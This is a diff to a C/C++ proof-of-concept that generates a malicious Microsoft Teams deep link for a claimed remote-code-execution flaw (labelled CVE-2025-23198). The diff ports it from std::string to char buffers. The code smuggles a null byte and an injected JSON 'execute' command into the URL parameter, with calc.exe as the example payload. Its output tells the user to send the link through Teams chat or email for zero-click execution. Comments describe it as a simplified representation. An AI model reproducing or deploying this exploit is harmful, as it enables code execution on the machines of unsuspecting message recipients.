@@ -6,20 +6,18 @@
 // Proof of Concept: Generates a malicious deep link payload
 // that exploits an IPC parameter sanitization flaw in Teams.
 
-bool GenerateTeamsPayload(const std::string& payloadPath, std::string& outDeepLink) {
+bool GenerateTeamsPayload(const char* payloadPath, char* outDeepLink, size_t maxLen) {
     // In a real exploit, this would construct a complex JSON payload
     // that escapes the IPC message boundary and executes arbitrary code.
     // This is a simplified representation of the deep link structure.
     
-    std::string baseUri = "msteams://teams.microsoft.com/l/message/0/0?url=";
+    const char* baseUri = "msteams://teams.microsoft.com/l/message/0/0?url=";
     
     // The vulnerability involves injecting null bytes or specific
     // control characters to break out of the expected URL parameter
     // and inject commands directly into the Electron IPC channel.
     
-    std::string smuggledPayload = std::string("file:///") + payloadPath + std::string("%00\"}],[{\"type\":\"execute\",\"command\":\"") + payloadPath + std::string("\"}]");
-    
-    outDeepLink = baseUri + smuggledPayload;
+    snprintf(outDeepLink, maxLen, "%sfile:///%s%%00\"}],[{\"type\":\"execute\",\"command\":\"%s\"}]", baseUri, payloadPath, payloadPath);
     
     printf("[+] Payload generated successfully.\n");
     return true;
@@ -28,11 +26,11 @@ bool GenerateTeamsPayload(const std::string& payloadPath, std::string& outDeepLi
 int main() {
     printf("[*] Generating CVE-2025-23198 Teams RCE Payload...\n");
     
-    std::string payloadPath = "C:\\Windows\\System32\\calc.exe"; // Example payload
-    std::string maliciousLink;
+    const char* payloadPath = "C:\\Windows\\System32\\calc.exe"; // Example payload
+    char maliciousLink[1024];
     
-    if (GenerateTeamsPayload(payloadPath, maliciousLink)) {
-        printf("[+] Malicious Deep Link:\n%s\n", maliciousLink.c_str());
+    if (GenerateTeamsPayload(payloadPath, maliciousLink, sizeof(maliciousLink))) {
+        printf("[+] Malicious Deep Link:\n%s\n", maliciousLink);
         printf("[*] Send this link via Teams chat or email. Zero-click execution triggers upon rendering.\n");
     } else {
         printf("[-] Failed to generate payload.\n");
